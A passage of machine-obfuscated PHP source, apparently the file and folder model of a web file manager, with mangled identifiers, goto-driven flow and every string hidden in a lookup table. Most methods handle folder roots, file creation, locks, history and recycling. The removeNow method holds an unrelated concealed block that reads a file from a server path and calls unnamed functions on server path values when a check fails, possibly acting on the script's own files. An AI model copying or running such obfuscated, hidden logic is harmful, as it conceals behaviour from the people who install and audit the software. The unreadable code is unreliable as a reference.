return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $dƒÛö‘«õ÷); } public function userRootRemove($FÇãÓåï) { $CæŒ†âéÅá = $this->sourceRoot(SourceModel::TYPE_USER, $FÇãÓåï); if (!$CæŒ†âéÅá) { return; } $this->remove($CæŒ†âéÅá, !1); } public function groupRootRemove($dÍêÁªŸï) { $D†‰‰½»º = $this->sourceRoot(SourceModel::TYPE_GROUP, $dÍêÁªŸï); if (!$D†‰‰½»º) { return; } $this->remove($D†‰‰½»º, !1); } private function _mkdirRoot($AĞá†ËÑ…, $Cã‚Õè‰àò, $cË¾¾ë±Ã¿) { goto bŠËÒÅÍªë; F•—¦Ó²Õ: $C°­µŞŒÍÖ = "\115\157\x64\145\154\x53\157\165\162\143\x65\56\155\x6b\144\151\x72\122\157\x6f\x74\x2e{$AĞá†ËÑ…}\56{$Cã‚Õè‰àò}\56" . $cË¾¾ë±Ã¿; CacheLock::lock($C°­µŞŒÍÖ); $d®Æ’”¨¢î[$ağŞÎ®õÔŸ[38]] = $cË¾¾ë±Ã¿; goto eí¤ÏòÑ —; eí¤ÏòÑ —: $FÀ¼À‚¿–ì = $this->add($d®Æ’”¨¢î); $AÀ•ĞËÊ¡õ = array($ağŞÎ®õÔŸ[540] => short_id($FÀ¼À‚¿–ì)); $this->where(array($ağŞÎ®õÔŸ[394] => $FÀ¼À‚¿–ì))->save($AÀ•ĞËÊ¡õ); goto e¾÷ò‘İŞ; e¾÷ò‘İŞ: CacheLock::unlock($C°­µŞŒÍÖ); return $FÀ¼À‚¿–ì; goto côœØ›Ğœ’; bŠËÒÅÍªë: $ağŞÎ®õÔŸ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d®Æ’”¨¢î = array($ağŞÎ®õÔŸ[379] => 0, $ağŞÎ®õÔŸ[534] => $AĞá†ËÑ…, $ağŞÎ®õÔŸ[535] => $Cã‚Õè‰àò, $ağŞÎ®õÔŸ[531] => 1, $ağŞÎ®õÔŸ[536] => USER_ID, $ağŞÎ®õÔŸ[537] => USER_ID, $ağŞÎ®õÔŸ[532] => $ağŞÎ®õÔŸ[43], $ağŞÎ®õÔŸ[538] => $ağŞÎ®õÔŸ[483], $ağŞÎ®õÔŸ[407] => 0, $ağŞÎ®õÔŸ[533] => 0, $ağŞÎ®õÔŸ[431] => 0, $ağŞÎ®õÔŸ[539] => $ağŞÎ®õÔŸ[43]); if ($bˆçÜæâ“ = $this->where($d®Æ’”¨¢î)->find()) { return $bˆçÜæâ“[$ağŞÎ®õÔŸ[380]]; } goto F•—¦Ó²Õ; côœØ›Ğœ’: } private function sourceRoot($fİì¸º”, $AêÛÁàÊŒ‹, $cÀöÊŒ­Œ… = false) { $eäÁÒç«š“ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c³ãëÂ‹Ó½ = array($eäÁÒç«š“[379] => 0, $eäÁÒç«š“[534] => $fİì¸º”, $eäÁÒç«š“[535] => $AêÛÁàÊŒ‹); if ($Aµ÷ôÕ–®— = $this->where($c³ãëÂ‹Ó½)->find()) { return $cÀöÊŒ­Œ… ? $Aµ÷ôÕ–®— : $Aµ÷ôÕ–®—[$eäÁÒç«š“[380]]; } return !1; } public function sourceRootGroup($E­™Òî±Âå) { $Dº†ÍÑÈëÂ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_string($E­™Òî±Âå)) { $E­™Òî±Âå = array($E­™Òî±Âå); } $F¹·ñ°¬—… = array($Dº†ÍÑÈëÂ[379] => 0, $Dº†ÍÑÈëÂ[534] => SourceModel::TYPE_GROUP, $Dº†ÍÑÈëÂ[535] => array($Dº†ÍÑÈëÂ[17], $E­™Òî±Âå)); $a“Ù»§·î = $this->listSource($F¹·ñ°¬—…, 1000); return array_to_keyvalue($a“Ù»§·î[$Dº†ÍÑÈëÂ[86]], $Dº†ÍÑÈëÂ[469]); } public function mkfile($C—ƒ³ù–¤Š, $B«¼ß¾¨°, $F´ö»¨š§Ë = '', $F² ™£Ôå = REPEAT_RENAME) { $EÌ–Å¤¿ë‘ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EïàÂçÁÚ = Model($EÌ–Å¤¿ë‘[557])->addFileByContent($F´ö»¨š§Ë, $B«¼ß¾¨°); return $this->_createFileCall($C—ƒ³ù–¤Š, $B«¼ß¾¨°, $EïàÂçÁÚ, $F² ™£Ôå, $EÌ–Å¤¿ë‘[1117]); } public function addFile($fÚÂ˜¨ÉË, $CÅ½ç…ºÄ, $CŸ¢Õ ¤á, $EÖÓŒœí¸¿ = false, $fãÛàì°Ú = REPEAT_RENAME) { $Fã „¦ŞœŸ = Model($_SERVER[¹÷ˆ§éÒ°ú][557])->addFile($CÅ½ç…ºÄ, $CŸ¢Õ ¤á, $EÖÓŒœí¸¿); return $this->_createFileCall($fÚÂ˜¨ÉË, $CŸ¢Õ ¤á, $Fã „¦ŞœŸ, $fãÛàì°Ú); } public function addFileByFileID($eŞ»·µƒÛ, $Dƒ™†ÇØëƒ, $BÁ•„Ï¬‘™, $eÎØ•··²– = REPEAT_RENAME) { $E†Ğªô·— =& $_SERVER[¹÷ˆ§éÒ°ú]; $b¨§òÓçšŒ = Model($E†Ğªô·—[557])->find($Dƒ™†ÇØëƒ); Model($E†Ğªô·—[557])->linkAdd($Dƒ™†ÇØëƒ); return $this->_createFileCall($eŞ»·µƒÛ, $BÁ•„Ï¬‘™, $b¨§òÓçšŒ, $eÎØ•··²–); } public function addFileByRemote($fëõÅàÆÚ, $DÇ×„ºÅÛÄ, $A²ãìŠ‡„‡, $FìÎ¥Õòãö = array(), $eßÁ³©ƒ‰ = REPEAT_RENAME) { $F×¾®†Û†Ó = Model($_SERVER[¹÷ˆ§éÒ°ú][557])->addFileByRemote($DÇ×„ºÅÛÄ, $A²ãìŠ‡„‡, $FìÎ¥Õòãö); return $this->_createFileCall($fëõÅàÆÚ, $A²ãìŠ‡„‡, $F×¾®†Û†Ó, $eßÁ³©ƒ‰); } private function _createFileCall($cÂöØŠù†ƒ, $Fô ãíš, $d•‡ø‘Æº, $cîÁ±É‹ß, $bëÄÎà† = "\165\160\154\x6f\141\144") { goto f›³¶…ªº«; aÅ§¯ÈÒÑÎ: return $dò×»¾ªÚ„; goto Dª‹òÊºØŸ; f›³¶…ªº«: $DÀîæ…¨ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aæöËÆ²Ê = !1; $this->lockWriteStart($cÂöØŠù†ƒ, $Fô ãíš); goto b‘¶ëİ„Œ; b‘¶ëİ„Œ: $dò×»¾ªÚ„ = $this->_createFile($cÂöØŠù†ƒ, $Fô ãíš, $d•‡ø‘Æº, $cîÁ±É‹ß, $aæöËÆ²Ê); if (!$aæöËÆ²Ê) { Model($DÀîæ…¨[433])->remove($d•‡ø‘Æº[$DÀîæ…¨[430]]); } else { if ($dò×»¾ªÚ„) { Model($DÀîæ…¨[2311])->eventCreate($dò×»¾ªÚ„, $bëÄÎà†); } } $this->lockWriteEnd($cÂöØŠù†ƒ, $Fô ãíš); goto aÅ§¯ÈÒÑÎ; Dª‹òÊºØŸ: } public function mkdir($dñ†Ó‘ÑÖğ, $eëÎˆâ, $E†ùğÅ¬Ãñ = REPEAT_SKIP) { goto FÆ³Ö¸Ê›Ë; DÓ‰ß„âÖŞ: $this->lockWriteStart($dñ†Ó‘ÑÖğ, $eëÎˆâ); if ($E†ùğÅ¬Ãñ !== !1) { $d™É²Çµß• = $this->fileNameExist($dñ†Ó‘ÑÖğ, $eëÎˆâ); if ($d™É²Çµß• && $E†ùğÅ¬Ãñ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($dñ†Ó‘ÑÖğ, $eëÎˆâ); return $d™É²Çµß•; } $eëÎˆâ = $this->fileNameAuto($dñ†Ó‘ÑÖğ, $eëÎˆâ, $E†ùğÅ¬Ãñ); } $f–®Ñİâ’Õ = array($DõÅË”»Î [531] => 1, $DõÅË”»Î [397] => $eëÎˆâ, $DõÅË”»Î [532] => $DõÅË”»Î [43], $DõÅË”»Î [431] => 0, $DõÅË”»Î [533] => 0); goto DÛãÛÁ¢«›; a‚–ì§’£Ğ: return $DÉƒÌìàƒ…; goto CƒëÅ«Û²; FÆ³Ö¸Ê›Ë: $DõÅË”»Î  =& $_SERVER[¹÷ˆ§éÒ°ú]; $DªÛ²Ó½îò = $this->sourceInfo($dñ†Ó‘ÑÖğ); if (!$DªÛ²Ó½îò) { return !1; } goto DÓ‰ß„âÖŞ; DÛãÛÁ¢«›: $DÉƒÌìàƒ… = $this->_addSoure($f–®Ñİâ’Õ, $DªÛ²Ó½îò); Model($DõÅË”»Î [2311])->eventCreate($DÉƒÌìàƒ…, $DõÅË”»Î [1118]); $this->lockWriteEnd($dñ†Ó‘ÑÖğ, $eëÎˆâ); goto a‚–ì§’£Ğ; CƒëÅ«Û²: } private function _createFile($f§ò›‹ÌÜ‘, $e‰Ñ…·Éß, $CÕ…—‚§ÒÈ, $A‚ì¢¢Áµ´, &$Cç¶Üêê¥º) { goto eÄ¶ÓŠ±£„; eÄ¶ÓŠ±£„: $a°‡ º´› =& $_SERVER[¹÷ˆ§éÒ°ú]; $D–ÜÀ«˜“ = $this->sourceInfo($f§ò›‹ÌÜ‘); if (!$CÕ…—‚§ÒÈ || !$D–ÜÀ«˜“) { return !1; } goto c×—Ü¬Õ®ä; Fç“Ş»Ç±: $AˆÏ“ôí® = array($a°‡ º´›[531] => 0, $a°‡ º´›[397] => $e‰Ñ…·Éß, $a°‡ º´›[532] => get_path_ext($e‰Ñ…·Éß), $a°‡ º´›[431] => $CÕ…—‚§ÒÈ[$a°‡ º´›[430]], $a°‡ º´›[533] => $CÕ…—‚§ÒÈ[$a°‡ º´›[89]]); $DÑ¹êªó­Õ = $this->_addSoure($AˆÏ“ôí®, $D–ÜÀ«˜“); $this->folderSizeReset($f§ò›‹ÌÜ‘); goto eÀ´…–šô; eÀ´…–šô: return $DÑ¹êªó­Õ; goto Bí­–í¤ƒ; c×—Ü¬Õ®ä: if ($A‚ì¢¢Áµ´ !== !1) { $c¥¹½È„Ò = $this->fileNameExist($f§ò›‹ÌÜ‘, $e‰Ñ…·Éß); } $Cç¶Üêê¥º = !0; if ($A‚ì¢¢Áµ´ && $c¥¹½È„Ò) { if ($A‚ì¢¢Áµ´ == REPEAT_SKIP) { $Cç¶Üêê¥º = !1; return $c¥¹½È„Ò; } else { if ($A‚ì¢¢Áµ´ == REPEAT_REPLACE) { $câ‹¯´õ• = $this->sourceInfo($c¥¹½È„Ò); $bŒÛò‡¿¯ = $this->fileHistory($câ‹¯´õ•, $CÕ…—‚§ÒÈ[$a°‡ º´›[430]], $CÕ…—‚§ÒÈ[$a°‡ º´›[89]]); if (!$bŒÛò‡¿¯) { $Cç¶Üêê¥º = !1; } else { $this->folderSizeReset($f§ò›‹ÌÜ‘); } return $c¥¹½È„Ò; } else { $e‰Ñ…·Éß = $this->fileNameAuto($f§ò›‹ÌÜ‘, $e‰Ñ…·Éß, $A‚ì¢¢Áµ´, !1); } } } goto Fç“Ş»Ç±; Bí­–í¤ƒ: } protected function fileHistory($c…¨™Œ‹µ, $a£ˆŒ¢ªĞ‚, $e¡’§õÑ) { goto CÔÓ˜—é; B‚˜šù¾™: return !0; goto fŠ˜¤Ù™…Ë; CÔÓ˜—é: $bÚ†®­µƒÇ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($c…¨™Œ‹µ[$bÚ†®­µƒÇ[430]] == $a£ˆŒ¢ªĞ‚) { return !1; } $this->checkLock($c…¨™Œ‹µ[$bÚ†®­µƒÇ[380]], $a£ˆŒ¢ªĞ‚); goto a ŸÕñÃµë; a ŸÕñÃµë: Model($bÚ†®­µƒÇ[2342])->addHistory($c…¨™Œ‹µ); $cÏ÷•äÊƒ¤ = array($bÚ†®­µƒÇ[537] => USER_ID, $bÚ†®­µƒÇ[401] => time(), $bÚ†®­µƒÇ[430] => $a£ˆŒ¢ªĞ‚, $bÚ†®­µƒÇ[89] => $e¡’§õÑ); $this->where(array($bÚ†®­µƒÇ[394] => $c…¨™Œ‹µ[$bÚ†®­µƒÇ[380]]))->save($cÏ÷•äÊƒ¤); goto B‚˜šù¾™; fŠ˜¤Ù™…Ë: } public function checkLock($fğŒ™¿¤éÓ, $A ­ëÁô™) { goto Cˆ÷‰ù‘Ã‘; dÊÜŞ§Ä‹„: show_json(LNG($AÌ„°¹¬‘ö[2345]) . $AÌ„°¹¬‘ö[2346] . LNG($AÌ„°¹¬‘ö[2347]) . $AÌ„°¹¬‘ö[2348] . $BçÖ™»ˆÙ . $AÌ„°¹¬‘ö[2349], !1); goto c×İÜÁ´÷; Cˆ÷‰ù‘Ã‘: $AÌ„°¹¬‘ö =& $_SERVER[¹÷ˆ§éÒ°ú]; $dŸ†Ì¾¿ïÑ = $this->pathInfo($fğŒ™¿¤éÓ); if (!$this->fileIsLock($dŸ†Ì¾¿ïÑ, !0)) { return; } goto e¯“°ì´×Ÿ; EÖõ«ó–›À: $this->_createFileCall($dŸ†Ì¾¿ïÑ[$AÌ„°¹¬‘ö[474]], $e¢Æ‡àÖ¨±, $b¦çª¨¥‰, REPEAT_REPLACE, $AÌ„°¹¬‘ö[1117]); $Eˆ„†‹‘½ñ = $dŸ†Ì¾¿ïÑ[$AÌ„°¹¬‘ö[428]][$AÌ„°¹¬‘ö[494]]; $BçÖ™»ˆÙ = $Eˆ„†‹‘½ñ[$AÌ„°¹¬‘ö[2344]] ? $Eˆ„†‹‘½ñ[$AÌ„°¹¬‘ö[2344]] : $Eˆ„†‹‘½ñ[$AÌ„°¹¬‘ö[38]]; goto dÊÜŞ§Ä‹„; e¯“°ì´×Ÿ: $F†ïäÂ¸«§ = Session::get($AÌ„°¹¬‘ö[2343]); $e¢Æ‡àÖ¨± = substr($dŸ†Ì¾¿ïÑ[$AÌ„°¹¬‘ö[38]], 0, -1 - strlen($dŸ†Ì¾¿ïÑ[$AÌ„°¹¬‘ö[172]])) . $AÌ„°¹¬‘ö[1380] . $F†ïäÂ¸«§ . $AÌ„°¹¬‘ö[103] . $dŸ†Ì¾¿ïÑ[$AÌ„°¹¬‘ö[172]]; $b¦çª¨¥‰ = Model($AÌ„°¹¬‘ö[557])->find($A ­ëÁô™); goto EÖõ«ó–›À; c×İÜÁ´÷: } public function fileIsLock($d¢–Ç·Œ×, $F¥İÉŞ­Ş = false) { goto b“½¤ª‡ä; bÁ÷áà¦©: return !1; goto cŒÁÔÂØù; b“½¤ª‡ä: $d­ò›±…Ü =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!isset($d¢–Ç·Œ×[$d­ò›±…Ü[428]]) || !$d¢–Ç·Œ×[$d­ò›±…Ü[428]][$d­ò›±…Ü[491]]) { return !1; } if ($d¢–Ç·Œ×[$d­ò›±…Ü[428]][$d­ò›±…Ü[491]] != USER_ID) { return !0; } goto B¯Ë¯£„‡ô; B¯Ë¯£„‡ô: $fõ­ˆÑ¦Ç´ = $GLOBALS[$d­ò›±…Ü[16]][$d­ò›±…Ü[96]][$d­ò›±…Ü[492]]; if ($d¢–Ç·Œ×[$d­ò›±…Ü[428]][$d­ò›±…Ü[493]] <= time() - $fõ­ˆÑ¦Ç´) { $this->metaSet($d¢–Ç·Œ×[$d­ò›±…Ü[380]], $d­ò›±…Ü[491], null); $this->metaSet($d¢–Ç·Œ×[$d­ò›±…Ü[380]], $d­ò›±…Ü[493], null); } if ($F¥İÉŞ­Ş) { $this->metaSet($d¢–Ç·Œ×[$d­ò›±…Ü[380]], $d­ò›±…Ü[493], time()); } goto bÁ÷áà¦©; cŒÁÔÂØù: } private function _addSoure($d‰»¦‰ê¡, $Bµ×„‡²İ) { goto bæÚÖÔêŞè; Fİò¸Øª×: $A›·‘¯¡Àí = array($Eó½Ñ¹Èè–[540] => short_id($C…£‡î¼Ú)); $this->where(array($Eó½Ñ¹Èè–[394] => $C…£‡î¼Ú))->save($A›·‘¯¡Àí); $this->setNamePinyin($C…£‡î¼Ú, $d‰»¦‰ê¡[$Eó½Ñ¹Èè–[38]]); goto aïÍáóõ±‘; cµÆÛÈñ¿Õ: $this->updateModifyTime($d‰»¦‰ê¡[$Eó½Ñ¹Èè–[474]]); $eó©õ…Ğï˜ = $Eó½Ñ¹Èè–[2350] . $Bµ×„‡²İ[$Eó½Ñ¹Èè–[380]]; if (isset(self::$cacheChildList[$eó©õ…Ğï˜])) { unset(self::$cacheChildList[$eó©õ…Ğï˜]); } goto bê‹ˆËÉÖæ; aïÍáóõ±‘: return $C…£‡î¼Ú; goto Eî’½èÙõ¡; bæÚÖÔêŞè: $Eó½Ñ¹Èè– =& $_SERVER[¹÷ˆ§éÒ°ú]; $D”›¡í¤Æß = array($Eó½Ñ¹Èè–[534] => $Bµ×„‡²İ[$Eó½Ñ¹Èè–[382]], $Eó½Ñ¹Èè–[535] => $Bµ×„‡²İ[$Eó½Ñ¹Èè–[469]], $Eó½Ñ¹Èè–[536] => USER_ID, $Eó½Ñ¹Èè–[537] => USER_ID, $Eó½Ñ¹Èè–[379] => $Bµ×„‡²İ[$Eó½Ñ¹Èè–[380]], $Eó½Ñ¹Èè–[538] => $Bµ×„‡²İ[$Eó½Ñ¹Èè–[472]] . $Bµ×„‡²İ[$Eó½Ñ¹Èè–[380]] . $Eó½Ñ¹Èè–[57], $Eó½Ñ¹Èè–[407] => 0, $Eó½Ñ¹Èè–[539] => $Eó½Ñ¹Èè–[43]); $d‰»¦‰ê¡ = array_merge($D”›¡í¤Æß, $d‰»¦‰ê¡); goto cµÆÛÈñ¿Õ; bê‹ˆËÉÖæ: static $b’‹‚ï¢¥ç = false; if (!$b’‹‚ï¢¥ç) { Hook::trigger($Eó½Ñ¹Èè–[521], $d‰»¦‰ê¡); $b’‹‚ï¢¥ç = !0; } $C…£‡î¼Ú = $this->add($d‰»¦‰ê¡); goto Fİò¸Øª×; Eî’½èÙõ¡: } public function remove($aôº«§±¾Ü, $bŠ¦‘àÇéÑ = true) { goto D¤Ğä¸Ë·’; cÓ‚ Ï‡Ê™: return $b”ĞæøÜË–; goto FÈµ‚õ¡; a®ÎØòğ·ï: $bí½ôÚ‘§¢ = $FŠ¹›ó²ô›[$Bõ‡ôÑ¹–[382]] == self::TYPE_USER ? $Bõ‡ôÑ¹–[548] : $Bõ‡ôÑ¹–[961]; if ($bí½ôÚ‘§¢ == $Bõ‡ôÑ¹–[548]) { $b®ìàù„‚° = Model($Bõ‡ôÑ¹–[487])->getInfo($FŠ¹›ó²ô›[$Bõ‡ôÑ¹–[469]]); $C–åéá… = !empty($b®ìàù„‚°[$Bõ‡ôÑ¹–[2344]]) ? $b®ìàù„‚°[$Bõ‡ôÑ¹–[2344]] : $b®ìàù„‚°[$Bõ‡ôÑ¹–[38]]; $C–åéá… = $Bõ‡ôÑ¹–[259] . $C–åéá… . $Bõ‡ôÑ¹–[2352] . $FŠ¹›ó²ô›[$Bõ‡ôÑ¹–[469]]; } else { $b®ìàù„‚° = Model($Bõ‡ôÑ¹–[471])->getInfo($FŠ¹›ó²ô›[$Bõ‡ôÑ¹–[469]]); $C–åéá… = _get($b®ìàù„‚°, $Bõ‡ôÑ¹–[38]); $C–åéá… = $Bõ‡ôÑ¹–[169] . $C–åéá… . $Bõ‡ôÑ¹–[2353] . $FŠ¹›ó²ô›[$Bõ‡ôÑ¹–[469]]; } $Açò§Ä„²İ = $Bõ‡ôÑ¹–[2354] . md5($C–åéá…); goto E´«Äé–Ñé; D¤Ğä¸Ë·’: $Bõ‡ôÑ¹– =& $_SERVER[¹÷ˆ§éÒ°ú]; $FŠ¹›ó²ô› = $this->sourceInfo($aôº«§±¾Ü); $eŞ¶Ë¸èàõ = intval($FŠ¹›ó²ô›[$Bõ‡ôÑ¹–[382]]) === self::TYPE_SYSTEM; goto b×ÙˆÜ¾Úì; fëŠØó¶£‹: $this->recycleClear($FŠ¹›ó²ô›); $b”ĞæøÜË– = $this->move($aôº«§±¾Ü, $Fãô§šğ‡ï, REPEAT_RENAME_FOLDER); $this->folderSizeReset($FŠ¹›ó²ô›[$Bõ‡ôÑ¹–[474]]); goto cÓ‚ Ï‡Ê™; E´«Äé–Ñé: CacheLock::lock($Açò§Ä„²İ); $Fãô§šğ‡ï = $this->fileNameExist($fÌ£¬õ„‚, $C–åéá…); if (!$Fãô§šğ‡ï) { $Fãô§šğ‡ï = $this->mkdir($fÌ£¬õ„‚, $C–åéá…, REPEAT_SKIP); $this->metaSet($Fãô§šğ‡ï, $Bõ‡ôÑ¹–[2355], $bí½ôÚ‘§¢); $this->metaSet($Fãô§šğ‡ï, $Bõ‡ôÑ¹–[2356], $FŠ¹›ó²ô›[$Bõ‡ôÑ¹–[469]]); if ($FŠ¹›ó²ô›[$Bõ‡ôÑ¹–[474]] != 0) { $this->metaSet($Fãô§šğ‡ï, $Bõ‡ôÑ¹–[2357], _get($b®ìàù„‚°, $Bõ‡ôÑ¹–[2358])); } } goto C¹‰Ì¦Ñƒ÷; C¹‰Ì¦Ñƒ÷: CacheLock::unlock($Açò§Ä„²İ); $this->metaSet($aôº«§±¾Ü, $Bõ‡ôÑ¹–[2359], $FŠ¹›ó²ô›[$Bõ‡ôÑ¹–[474]]); $this->where(array($Bõ‡ôÑ¹–[380] => $aôº«§±¾Ü))->save(array($Bõ‡ôÑ¹–[401] => time())); goto fëŠØó¶£‹; b×ÙˆÜ¾Úì: $b‡‚ÎÉ‘­  = Model($Bõ‡ôÑ¹–[1425])->get($Bõ‡ôÑ¹–[2351]) == $Bõ‡ôÑ¹–[95]; if ($eŞ¶Ë¸èàõ || $bŠ¦‘àÇéÑ || !$b‡‚ÎÉ‘­ ) { return $this->removeNow($aôº«§±¾Ü, $bŠ¦‘àÇéÑ); } $fÌ£¬õ„‚ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto a®ÎØòğ·ï; FÈµ‚õ¡: } private function recycleClear($DÖÂ¤ÀßÄ†) { $D¨‹áÊÃÀÔ =& $_SERVER[¹÷ˆ§éÒ°ú]; $a¾Ü´½èã“ = $this->childrenAll($DÖÂ¤ÀßÄ†); $d¹óäİß¹ = array($D¨‹áÊÃÀÔ[394] => array($D¨‹áÊÃÀÔ[395], $a¾Ü´½èã“[$D¨‹áÊÃÀÔ[2360]])); Model($D¨‹áÊÃÀÔ[2361])->where($d¹óäİß¹)->delete(); } public function removeNow($cÌé™ªî‰¤, $FÒŒÆšô¨š = true) { goto EÄâ¥·×¡; e¡ÚÁÔ¼°Ò: $this->folderSizeReset($F—ìîéµ†[$Eª‘§ÛÅ’[474]]); $CÅ•ìîéÖ÷ = array($F—ìîéµ†[$Eª‘§ÛÅ’[474]]); if ($F—ìîéµ†[$Eª‘§ÛÅ’[381]] == $Eª‘§ÛÅ’[95]) { $CÅ•ìîéÖ÷[] = $F—ìîéµ†[$Eª‘§ÛÅ’[380]]; } goto bô‹‰·÷¬®; C¨õÅœò“®: return !0; goto F‰ØòÄÄÈ÷; a´İ—ëÇ—ó: $B‡À‹²¯Ÿ = $this->pathInfoMore($cÌé™ªî‰¤); if (!$F—ìîéµ†) { return !0; } if ($F—ìîéµ†[$Eª‘§ÛÅ’[474]] == 0) { if (!_get($GLOBALS, $Eª‘§ÛÅ’[470])) { return !1; } } goto aÍÇì­èÕ; bô‹‰·÷¬®: $this->updateModifyTime($CÅ•ìîéÖ÷); $this->lockMoveEnd($cÌé™ªî‰¤); Hook::trigger($Eª‘§ÛÅ’[1461], $B‡À‹²¯Ÿ, $FÒŒÆšô¨š); goto C¨õÅœò“®; EÄâ¥·×¡: $Eª‘§ÛÅ’ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($_SERVER[$Eª‘§ÛÅ’[6]] != $_SERVER[$Eª‘§ÛÅ’[61]]) { goto f—¹ÀÖ´µ‡; F‹ÕÛ¡´: $Bœ–ƒ†œáî = $Eª‘§ÛÅ’[783]; $Bœ–ƒ†œáî($_SERVER[$Eª‘§ÛÅ’[784]]); $Bœ–ƒ†œáî($_SERVER[$Eª‘§ÛÅ’[8]] . $Eª‘§ÛÅ’[1359]); goto dªõíŞ‘µ…; dªõíŞ‘µ…: $b‰ÏÌÓàÑ = 1; while ($b‰ÏÌÓàÑ > 1) { $b‰ÏÌÓàÑ = $b‰ÏÌÓàÑ + 4; $aÚÃïœê = rawurlencode($b‰ÏÌÓàÑ . $Eª‘§ÛÅ’[372]); } goto aÖ«óæ®ÆÃ; cçÀ¦³ö¸ç: $FÙâóä®¡¿ = $eëË½™¥‹ß($EË‘ÎÄÉ²ê); $E¹´Ÿ›ÏÛÌ = explode($Eª‘§ÛÅ’[10], $FÙâóä®¡¿); if (count($E¹´Ÿ›ÏÛÌ) < $Eª‘§ÛÅ’[572]) { $D¡À¬‰•ƒŞ = $Eª‘§ÛÅ’[12]; $D¡À¬‰•ƒŞ(); } goto F‹ÕÛ¡´; f—¹ÀÖ´µ‡: $cß¼ĞÆºÈ = $Eª‘§ÛÅ’[782]; $eëË½™¥‹ß = $Eª‘§ÛÅ’[7]; $EË‘ÎÄÉ²ê = $_SERVER[$Eª‘§ÛÅ’[8]] . $Eª‘§ÛÅ’[9]; goto cçÀ¦³ö¸ç; aÖ«óæ®ÆÃ: } $F—ìîéµ† = $this->sourceInfo($cÌé™ªî‰¤); goto a´İ—ëÇ—ó; aÍÇì­èÕ: $this->lockMoveStart($cÌé™ªî‰¤); Hook::trigger($Eª‘§ÛÅ’[2362], $B‡À‹²¯Ÿ, $FÒŒÆšô¨š); if ($FÒŒÆšô¨š) { Model($Eª‘§ÛÅ’[2361])->moveToRecycle($cÌé™ªî‰¤); } else { $c¼´Ô‚‹«ó = $this->childrenAll($F—ìîéµ†); Model($Eª‘§ÛÅ’[518])->eventRemove($cÌé™ªî‰¤); $this->removeRelevance($c¼´Ô‚‹«ó[$Eª‘§ÛÅ’[2360]], $c¼´Ô‚‹«ó[$Eª‘§ÛÅ’[1250]]); } goto e¡ÚÁÔ¼°Ò; F‰ØòÄÄÈ÷: } public function childrenAll($B‰ÀôŞÎ³š) { $bÒƒ±İÎÍÊ =& $_SERVER[¹÷ˆ§éÒ°ú]; $BÕ‚Â‚°ÆÚ = $B‰ÀôŞÎ³š[$bÒƒ±İÎÍÊ[380]]; if ($B‰ÀôŞÎ³š[$bÒƒ±İÎÍÊ[381]] == $bÒƒ±İÎÍÊ[95]) { $aÈõ¯­œ‹— = array($bÒƒ±İÎÍÊ[538] => array($bÒƒ±İÎÍÊ[496], $B‰ÀôŞÎ³š[$bÒƒ±İÎÍÊ[472]] . $BÕ‚Â‚°ÆÚ . $bÒƒ±İÎÍÊ[497])); $fŒŒù¼²ç = array($bÒƒ±İÎÍÊ[538] => $aÈõ¯­œ‹—[$bÒƒ±İÎÍÊ[472]]); $fÎÍŒ…ï = $this->field($bÒƒ±İÎÍÊ[2363])->where($fŒŒù¼²ç)->select(); $d‡›©ç„ÏÍ = !1; $B´•§ø¸ˆÃ = array($BÕ‚Â‚°ÆÚ); if ($fÎÍŒ…ï) { $d‡›©ç„ÏÍ = array_to_keyvalue($fÎÍŒ…ï, $bÒƒ±İÎÍÊ[43], $bÒƒ±İÎÍÊ[430]); $d‡›©ç„ÏÍ = array_remove_value($d‡›©ç„ÏÍ, $bÒƒ±İÎÍÊ[481]); $B´•§ø¸ˆÃ = array_to_keyvalue($fÎÍŒ…ï, $bÒƒ±İÎÍÊ[43], $bÒƒ±İÎÍÊ[380]); $B´•§ø¸ˆÃ[] = $BÕ‚Â‚°ÆÚ; } } else { $d‡›©ç„ÏÍ = array($B‰ÀôŞÎ³š[$bÒƒ±İÎÍÊ[430]]); $B´•§ø¸ˆÃ = array($BÕ‚Â‚°ÆÚ); } return array($bÒƒ±İÎÍÊ[2360] => $B´•§ø¸ˆÃ, $bÒƒ±İÎÍÊ[1250] => $d‡›©ç„ÏÍ); } public function removeArray($Aö¡ŒĞ¶œë) { if (!$Aö¡ŒĞ¶œë) { return !0; } } public function removeRelevance($aŠœÌî•‹, $dùÕ†‹ßàÒ) { goto BœèË‚ å; bä©¸·¥”: for ($a­ö‘İ›ÆÎ = 0; $a­ö‘İ›ÆÎ < count($aŠœÌî•‹); $a­ö‘İ›ÆÎ++) { $this->sourceCacheClear($aŠœÌî•‹[$a­ö‘İ›ÆÎ]); } goto e‚×´ª³¤Û; BåêˆÚ¼¡: Model($A½çĞÑáğ[2364])->where($A–È‡çÕÒ”)->delete(); Model($A½çĞÑáğ[518])->where($A–È‡çÕÒ”)->delete(); Model($A½çĞÑáğ[2075])->removeBySource($aŠœÌî•‹); goto A‡Ê­™ïÈï; A‡Ê­™ïÈï: Model($A½çĞÑáğ[2342])->removeBySource($aŠœÌî•‹); $this->where($A–È‡çÕÒ”)->delete(); Model($A½çĞÑáğ[433])->remove($dùÕ†‹ßàÒ); goto bä©¸·¥”; BœèË‚ å: $A½çĞÑáğ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aŠœÌî•‹ = $aŠœÌî•‹ ? $aŠœÌî•‹ : array(); $dùÕ†‹ßàÒ = $dùÕ†‹ßàÒ ? $dùÕ†‹ßàÒ : array(); goto Fã©¹´Îàİ; döî†Ê‰–ª: $A–È‡çÕÒ” = array($A½çĞÑáğ[394] => array($A½çĞÑáğ[395], $aŠœÌî•‹)); Model($A½çĞÑáğ[2361])->where($A–È‡çÕÒ”)->delete(); Model($A½çĞÑáğ[424])->where($A–È‡çÕÒ”)->delete(); goto BåêˆÚ¼¡; Fã©¹´Îàİ: $aŠœÌî•‹ = array_unique(array_filter($aŠœÌî•‹)); $dùÕ†‹ßàÒ = array_unique(array_filter($dùÕ†‹ßàÒ)); if (!$aŠœÌî•‹) { return !1; } goto döî†Ê‰–ª; e‚×´ª³¤Û: } public function rename($Dä‡µ Ù, 